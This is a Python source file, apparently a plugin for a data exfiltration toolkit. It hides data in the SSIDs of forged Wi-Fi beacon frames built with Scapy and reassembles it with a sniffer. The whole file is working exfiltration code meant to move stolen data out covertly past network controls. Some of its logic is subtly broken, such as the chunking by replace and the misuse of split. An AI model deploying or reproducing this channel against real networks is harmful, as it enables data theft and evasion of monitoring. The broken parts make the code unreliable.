from __future__ import print_function

try:
    from scapy.all import *
except:
    print("You should install Scapy if you run the server..")

config = None
app_exfiltrate = None
ap_list = []
ap_buffer = []
job_id = None

def PacketHandler(pkt):
    global ap_buffer, job_id 
    if pkt.haslayer(Dot11):
        if pkt.type == 00 and pkt.subtype == 8:
            if pkt.addr2 not in ap_list:
                ap_list.append(pkt.addr2)
                print("AP MAC: {} with SSID: {}".format(pkt.addr2, pkt.info))
                try:
                    data = pkt.info.decode('hex')
                    if len(ap_buffer) == 0:
                        job_id = data[:7]
                    print("job_id : {}".format(job_id))
                    ap_buffer.append(data)
                    print(ap_buffer)
                    try:
                        data_to_exfil = ''.join(ap_buffer)
                        print("data_to_exfil = {}".format(data_to_exfil))
                        if len(pkt.info) < 30:
                            data_to_exfil = ''.join(ap_buffer)
                            app_exfiltrate.retrieve_data(data_to_exfil)
                            ap_buffer = []
                        elif data_to_exfil.count(job_id) == 2:
                            packet_exfil = job_id + data_to_exfil.split(job_id)[0]
                            app_exfiltrate.retrieve_data(packet_exfil)
                            ap_buffer = data_to_exfil.split(packet_exfil, '')
                    except Exception as err:
                        print(err)
                        pass
                except Exception as err:
                    print(err)
                    pass

def send(data):
    # data = data.encode('hex')
    while data != "":
        tmp = data[:15]
        data = data.replace(tmp, '')
        tmp = tmp.encode('hex')
        app_exfiltrate.log_message('info', "[wifi] Sending {0} on {1}".format(tmp, config['interface']))
        netSSID = tmp       #Network name here
        iface = str(config['interface'])         #Interface name here

        dot11 = Dot11(type=0, subtype=8, addr1=RandMAC(),
        addr2=RandMAC(), addr3=RandMAC())
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID',info=netSSID, len=len(netSSID))
        rsn = Dot11Elt(ID='RSNinfo', info=(
        '\x01\x00'                 #RSN Version 1
        '\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
        '\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
        '\x00\x0f\xac\x04'         #AES Cipher
        '\x00\x0f\xac\x02'         #TKIP Cipher
        '\x01\x00'                 #1 Authentication Key Managment Suite (line below)
        '\x00\x0f\xac\x02'         #Pre-Shared Key
        '\x00\x00'))               #RSN Capabilities (no extra capabilities)
        frame = RadioTap()/dot11/beacon/essid/rsn
        # frame.show()
        # print("\nHexdump of frame:")
        # hexdump(frame)
        sendp(frame, iface=iface, inter=1)

def listen():
    print(config['interface'])
    app_exfiltrate.log_message('info', "[wifi] Waiting for Wi-Fi probe on {}".format(config['interface']))
    sniff(iface=str(config['interface']), prn=PacketHandler)    
    # sniff(iface="wlan1mon", prn=PacketHandler)


class Plugin:

    def __init__(self, app, conf):
        global config
        global app_exfiltrate
        config = conf
        app_exfiltrate = app
        app.register_plugin('wifi', {'send': send, 'listen': listen})
